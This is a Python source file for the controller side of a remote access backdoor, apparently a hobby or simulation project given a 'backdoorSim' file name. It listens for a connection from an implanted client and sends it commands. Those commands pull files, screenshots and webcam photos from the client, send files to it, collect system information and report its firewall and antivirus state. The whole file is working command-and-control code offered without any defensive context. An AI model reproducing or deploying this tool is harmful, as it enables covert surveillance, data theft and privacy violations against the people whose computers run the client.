from colorama import Style, Fore, init
import socket
import base64
import simplejson

init(autoreset=True)
class ControlServer:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print(f"{Fore.GREEN}Listening...: {Style.RESET_ALL} {ip}:{port}")
        (self.my_connection, my_address) = my_listener.accept()
        print(f"{Fore.CYAN}Connection OK from:{Style.RESET_ALL} {str(my_address)}")

    def show_help(self):
        help_text = """
        Available Commands:
        - upload [file_path]         : Upload a file to the client.
        - download [file_path]       : Download a file from the client.
        - screenshot                 : Take a screenshot from the client's screen.
        - sysinfo                    : Get system information from the client.
        - securityinfo               : Get security (firewall and antivirus) information from the client.
        - camshot                    : Take a camera shot from the client's webcam.
        - notify [title] [message]   : Send a notification to the client.
        - quit                       : Close the connection.
        - help                       : Show this help menu.
        """
        print(help_text)

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            if command_input.lower() == "help":
                self.show_help()
                continue
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
                elif command_input[0] == "screenshot" and "Error!" not in command_output:
                    command_output = self.save_file("source/backdoorSim.png", command_output)
                elif command_input[0] == "notify":
                    self.command_execution(command_input)
                    print("Notification command sent.")
                elif command_input[0] == "sysinfo":
                    system_info = command_output
                    for key, value in system_info.items():
                        print(f"{key}: {value}")
                        command_output = "System info displayed"
                elif command_input[0] == "camshot":
                    camera_image = self.command_execution(["camshot"])
                    if not camera_image.startswith("Error"):
                        self.save_file("camera_image.png", camera_image)
                    else:
                        print(camera_image)
                elif command_input[0] == "securityinfo":
                    security_info = self.command_execution(["securityinfo"])
                    print("Firewall Info:")
                    for item in security_info["Firewall"]:
                        print(f"- {item['Name']}: {'Enabled' if item['State'] else 'Disabled'}")
                    print("Antivirus Info:")
                    for item in security_info["Antivirus"]:
                        print(f"- {item['Name']}: {item['State']}")
            except Exception:
                command_output = "Error"
            print(command_output)

controlserver = ControlServer("0.0.0.0",8080)
controlserver.start_listener()